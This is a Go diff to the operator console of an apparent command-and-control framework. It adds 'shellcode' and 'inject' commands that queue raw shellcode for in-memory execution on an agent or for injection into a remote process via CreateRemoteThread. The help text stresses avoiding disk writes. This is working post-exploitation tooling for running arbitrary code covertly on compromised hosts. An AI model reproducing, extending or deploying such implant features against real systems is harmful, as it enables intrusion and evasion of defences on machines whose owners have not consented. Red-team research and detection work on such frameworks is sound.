@@ -152,6 +152,10 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdAgentTasks()
 	case "bof":
 		sh.cmdBOF(args)
+	case "shellcode":
+		sh.cmdShellcode(args)
+	case "inject":
+		sh.cmdInject(args)
 	default:
 		// Check if it's an AD command
 		if strings.HasPrefix(cmd, "ad-") {
@@ -471,7 +475,9 @@ func (sh *Shell) cmdAgentHelp() {
 		{"kill", "Terminate the agent"},
 		{"info", "Show agent details"},
 		{"tasks", "Show task history for this agent"},
-		{"bof <file> [args]", "Execute Beacon Object File"},
+		{"bof <file> [args]", "Execute Beacon Object File (in-memory)"},
+		{"shellcode <file>", "Execute raw shellcode in-memory"},
+		{"inject <pid> <file>", "Inject shellcode into remote process"},
 		{"ad-*", "Active Directory commands (type 'ad-help')"},
 		{"back", "Return to main menu"},
 	}
@@ -646,6 +652,40 @@ func (sh *Shell) cmdAgentTasks() {
 			fmt.Printf("  %s\n", string(result.Output))
 		}
 	}
+}
+
+func (sh *Shell) cmdShellcode(args []string) {
+	if len(args) == 0 {
+		Error("Usage: shellcode <bin-file>")
+		Info("Executes raw shellcode in the agent's process memory (no disk touch)")
+		return
+	}
+
+	data, err := os.ReadFile(args[0])
+	if err != nil {
+		Error("Failed to read shellcode file: %v", err)
+		return
+	}
+
+	sh.queueTask(protocol.TaskShellcode, nil, data)
+	Info("Shellcode size: %d bytes (in-memory execution)", len(data))
+}
+
+func (sh *Shell) cmdInject(args []string) {
+	if len(args) < 2 {
+		Error("Usage: inject <pid> <shellcode-file>")
+		Info("Injects shellcode into a remote process (Windows: CreateRemoteThread)")
+		return
+	}
+
+	data, err := os.ReadFile(args[1])
+	if err != nil {
+		Error("Failed to read shellcode file: %v", err)
+		return
+	}
+
+	sh.queueTask(protocol.TaskInject, []string{args[0]}, data)
+	Info("Injecting %d bytes into PID %s", len(data), args[0])
 }
 
 func (sh *Shell) cmdAD(cmd string, args []string) {
